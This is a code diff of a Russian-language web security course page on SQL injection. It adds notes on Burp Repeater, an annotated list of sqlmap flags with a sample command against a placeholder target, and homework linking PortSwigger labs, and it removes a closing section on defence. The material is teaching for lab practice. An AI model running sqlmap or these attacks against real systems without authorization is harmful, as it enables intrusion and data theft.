+                исключая возможность для параметров самим стать SQL-выражениями (в том числе зловредными). Стоит заметить, что другие механизмы, 
+                такие как использование принудительного приведения типов (например, с помощью функции <strong>intval()</strong>) в связке с 
+                экранированием строк такими функциями, как <strong>mysql_real_escape_string()</strong> или <strong>addslashes()</strong>, 
+                не являются абсолютно безопасными. Проблема в том, что существуют некоторые варианты для их обхода, а следовательно, 
+                к их использованию необходимо подходить с максимальным вниманием.
+              </li>
+            </ol>
+          </CardContent>
+        </Card>
+
+        <Card>
+          <CardHeader>
+            <CardTitle>Полезный инструментарий</CardTitle>
+          </CardHeader>
+          <CardContent className="space-y-4">
+            <div>
+              <H3>1. Repeater</H3>
+              <P>
+                Конечно же <strong>Repeater</strong> – в современных веб-приложениях зачастую нет смысла сканить автоматическими 
+                сканерами каждый параметр или предполагаемый хедер. Во-первых, сработает WAF, во-вторых нас может заблокировать 
+                на какое-то время и третье самое главное – займет очень много времени, а профита может не оказаться. Ставим кавычки, 
+                исследуем приложение, смотрим как отвечает и какие статусы ответа от сервера мы получаем. Также, можем попробовать 
+                добавить простой Payload и проверить как ответит тот-же WAF.
+              </P>
+            </div>
+
+            <div>
+              <H3>2. sqlmap</H3>
+              <P>
+                <strong>sqlmap</strong> – мощнейший инструмент для обнаружения, эксплуатации и извлечения данных. 
+                Имеет широкий функционал. <strong>Предустановлен в Kali Linux</strong>.
+              </P>
+              <P>Некоторые флаги ниже:</P>
+              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
+                <pre className="text-sm">
+{`sqlmap -u "URL" [options]
+
+sqlmap -u "https://target/page.php?id=1" --batch
+# batch работает как -y в Unix системах. То есть на все говорим Yes.
+
+-p              # указываем необходимый параметр (например email)
+--cookie        # передать cookie
+--headers       # дополнительные хедеры
+-r              # копируем весь запрос из Burp, сохраняем его как например sql_reset_password.txt
+                # и после запускаем: sqlmap -r sql_reset_password.txt
+
+--technique=BEUSTQ   # какие техники разрешены (B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline)
+--level         # глубина тестирования (1–5). Больше = более агрессивно.
+--risk          # риск payload'ов (1–3). Больше = рискованнее.
+--threads       # сколько потоков для ускорения (для некоторых тестов).`}
+                </pre>
+              </div>
+              <P>
+                И т.д.. Только добавлю, что функционал настолько широк, что даже позволяет получить <strong>shell и командное управление</strong>.
+              </P>
+            </div>
+          </CardContent>
+        </Card>
+
+        <Card>
+          <CardHeader>
+            <CardTitle>Домашнее задание</CardTitle>
+          </CardHeader>
+          <CardContent className="space-y-4">
+            <P>
+              Если часть задач не получается из-за функционала <strong>Burp Suite Community Edition</strong>, попробуйте использовать{' '}
+              <strong>sqlmap</strong> в качестве тренировки.
+            </P>
+            <P>
+              В начале полезно почитать (и в дальнейшем изучить){' '}
+              <a 
+                href="https://portswigger.net/web-security/sql-injection/cheat-sheet" 
+                target="_blank" 
+                rel="noopener noreferrer"
+                className="text-primary hover:underline inline-flex items-center"
+              >
+                Cheat sheet <ExternalLink className="ml-1 h-4 w-4" />
+              </a>{' '}
+              по SQL инъекциям. (Возможно, часть теории будет дублироваться в этих теоретических вставках, но тут есть и 
+              некоторое расширение теории, поэтому рекомендуем изучить её перед выполнением практических задач)
+            </P>
+
+            <ol className="list-decimal pl-6 space-y-4">
+              <li>
+                Изучаем еще одну статейку о{' '}
                 <a 
                   href="https://portswigger.net/web-security/sql-injection" 
                   target="_blank" 
                   rel="noopener noreferrer"
-                  className="inline-flex items-center ml-2 text-primary hover:underline"
+                  className="text-primary hover:underline inline-flex items-center"
                 >
-                  Перейти к лабораториям <ExternalLink className="ml-1 h-4 w-4" />
-                </a>
-                <div className="ml-4 mt-2 text-sm text-muted-foreground">
-                  Рекомендуемые лабораторные работы:
-                  <ol className="list-decimal pl-6 mt-2 space-y-1">
-                    <li>SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</li>
-                    <li>SQL injection vulnerability allowing login bypass</li>
-                    <li>SQL injection UNION attack, determining the number of columns</li>
-                    <li>SQL injection UNION attack, finding a column containing text</li>
-                    <li>SQL injection UNION attack, retrieving data from other tables</li>
-                    <li>SQL injection UNION attack, retrieving multiple values in a single column</li>
-                    <li>SQL injection attack, querying the database type and version on Oracle</li>
-                    <li>SQL injection attack, querying the database type and version on MySQL and Microsoft</li>
-                    <li>SQL injection attack, listing the database contents on non-Oracle databases</li>
-                    <li>SQL injection attack, listing the database contents on Oracle</li>
-                    <li>Blind SQL injection with conditional responses</li>
-                    <li>Blind SQL injection with time delays and information retrieval</li>
-                  </ol>
-                </div>
+                  SQL injection <ExternalLink className="ml-1 h-4 w-4" />
+                </a>{' '}
+                и выполняем лабораторные работы:
+                <ul className="list-disc pl-6 mt-2 space-y-1">
+                  <li>
+                    <a 
+                      href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data" 
+                      target="_blank" 
+                      rel="noopener noreferrer"
+                      className="text-primary hover:underline inline-flex items-center"
+                    >
+                      SQL injection vulnerability in WHERE clause allowing retrieval of hidden data <ExternalLink className="ml-1 h-3 w-3" />
+                    </a>
+                  </li>
+                  <li>
+                    <a 
+                      href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" 
+                      target="_blank" 
+                      rel="noopener noreferrer"
+                      className="text-primary hover:underline inline-flex items-center"
+                    >
+                      SQL injection vulnerability allowing login bypass <ExternalLink className="ml-1 h-3 w-3" />
+                    </a>
+                  </li>
+                </ul>
               </li>
-              <li><strong>DVWA (Damn Vulnerable Web Application)</strong> - SQL Injection модуль</li>
-              <li><strong>SQLi Labs</strong> - Специализированная платформа для изучения SQLi</li>
-              <li><strong>HackTheBox</strong> - Machines с SQL Injection уязвимостями</li>
-              <li><strong>TryHackMe</strong> - SQL Injection комнаты</li>
-            </ul>
+
+              <li>
+                Углубляемся в поиск SQL injection и изучаем{' '}
+                <a 
+                  href="https://portswigger.net/web-security/sql-injection/union-attacks" 
+                  target="_blank" 
+                  rel="noopener noreferrer"
+                  className="text-primary hover:underline inline-flex items-center"
+                >
+                  UNION attacks <ExternalLink className="ml-1 h-4 w-4" />
+                </a>, выполняем лабораторные:
+                <ul className="list-disc pl-6 mt-2 space-y-1">
+                  <li>
+                    <a 
+                      href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns" 
+                      target="_blank" 
+                      rel="noopener noreferrer"
+                      className="text-primary hover:underline inline-flex items-center"
+                    >
+                      SQL injection UNION attack, determining the number of columns returned by the query <ExternalLink className="ml-1 h-3 w-3" />
+                    </a>
+                  </li>
+                  <li>
+                    <a 
+                      href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text" 
+                      target="_blank" 
+                      rel="noopener noreferrer"
+                      className="text-primary hover:underline inline-flex items-center"
+                    >
+                      SQL injection UNION attack, finding a column containing text <ExternalLink className="ml-1 h-3 w-3" />
+                    </a>
+                  </li>
+                  <li>
+                    <a 
+                      href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables" 
+                      target="_blank" 
+                      rel="noopener noreferrer"
+                      className="text-primary hover:underline inline-flex items-center"
+                    >
+                      SQL injection UNION attack, retrieving data from other tables <ExternalLink className="ml-1 h-3 w-3" />
+                    </a>
+                  </li>
+                </ul>
+              </li>
+
+              <li>
+                Не всегда результат инъекции будет отображаться, поэтому нам также важно уметь находить{' '}
+                <a 
+                  href="https://portswigger.net/web-security/sql-injection/blind" 
+                  target="_blank" 
+                  rel="noopener noreferrer"
+                  className="text-primary hover:underline inline-flex items-center"
+                >
+                  blind инъекции <ExternalLink className="ml-1 h-4 w-4" />
+                </a>:
+                <ul className="list-disc pl-6 mt-2 space-y-1">
+                  <li>
+                    <a 
+                      href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays" 
+                      target="_blank" 
+                      rel="noopener noreferrer"
+                      className="text-primary hover:underline inline-flex items-center"
+                    >
+                      Blind SQL injection with time delays <ExternalLink className="ml-1 h-3 w-3" />
+                    </a>
+                  </li>
+                </ul>
+              </li>
+
+              <li>
+                Теперь будем собирать{' '}
+                <a 
+                  href="https://portswigger.net/web-security/sql-injection/examining-the-database" 
+                  target="_blank" 
+                  rel="noopener noreferrer"
+                  className="text-primary hover:underline inline-flex items-center"
+                >
+                  информацию о базе данных с помощью SQL injection <ExternalLink className="ml-1 h-4 w-4" />
+                </a>{' '}
+                и выполнять лабораторные:
+                <ul className="list-disc pl-6 mt-2 space-y-1">
+                  <li>
+                    <a 
+                      href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle" 
+                      target="_blank" 
+                      rel="noopener noreferrer"
+                      className="text-primary hover:underline inline-flex items-center"
+                    >
+                      SQL injection attack, querying the database type and version on Oracle <ExternalLink className="ml-1 h-3 w-3" />
+                    </a>
+                  </li>
+                  <li>
+                    <a 
+                      href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft" 
+                      target="_blank" 
+                      rel="noopener noreferrer"
+                      className="text-primary hover:underline inline-flex items-center"
+                    >
+                      SQL injection attack, querying the database type and version on MySQL and Microsoft <ExternalLink className="ml-1 h-3 w-3" />
+                    </a>
+                  </li>
+                </ul>
+              </li>
+
+              <li>
+                Задачи со <strong>*</strong>, в них нужно получить информацию из базы данных. Для таких задач мы обычно используем{' '}
+                <strong>SQLmap</strong>, но также полезно уметь вытаскивать БД вручную:
+                <ul className="list-disc pl-6 mt-2 space-y-1">
+                  <li>
+                    <a 
+                      href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle" 
+                      target="_blank" 
+                      rel="noopener noreferrer"
+                      className="text-primary hover:underline inline-flex items-center"
+                    >
+                      SQL injection attack, listing the database contents on non-Oracle databases <ExternalLink className="ml-1 h-3 w-3" />
+                    </a>
+                  </li>
+                  <li>
+                    <a 
+                      href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle" 
+                      target="_blank" 
+                      rel="noopener noreferrer"
+                      className="text-primary hover:underline inline-flex items-center"
+                    >
+                      SQL injection attack, listing the database contents on Oracle <ExternalLink className="ml-1 h-3 w-3" />
+                    </a>
+                  </li>
+                  <li>
+                    <a 
+                      href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column" 
+                      target="_blank" 
+                      rel="noopener noreferrer"
+                      className="text-primary hover:underline inline-flex items-center"
+                    >
+                      SQL injection UNION attack, retrieving multiple values in a single column <ExternalLink className="ml-1 h-3 w-3" />
+                    </a>
+                  </li>
+                </ul>
+              </li>
+            </ol>
           </CardContent>
         </Card>
 
@@ -683,27 +677,6 @@ try {
                 />
               ))}
             </div>
-          </CardContent>
-        </Card>
-
-        <Card className="bg-primary/5 border-primary/20">
-          <CardHeader>
-            <CardTitle>Заключение</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <P>
-              SQL Injection остается одной из наиболее критичных уязвимостей веб-приложений, несмотря на то, 
-              что методы защиты хорошо известны. Ключ к предотвращению SQL Injection — <strong>всегда использовать 
-              параметризованные запросы</strong> и никогда не доверять пользовательскому вводу.
-            </P>
-            <P>
-              Понимание различных типов SQL Injection, методов эксплуатации и защиты критически важно для 
-              любого разработчика или специалиста по безопасности. Регулярное тестирование приложений на 
-              наличие SQL Injection должно быть частью процесса разработки.
-            </P>
-            <P>
-              <strong>Помните:</strong> Defense in Depth — используйте множественные уровни защиты!
-            </P>
           </CardContent>
         </Card>
       </div>
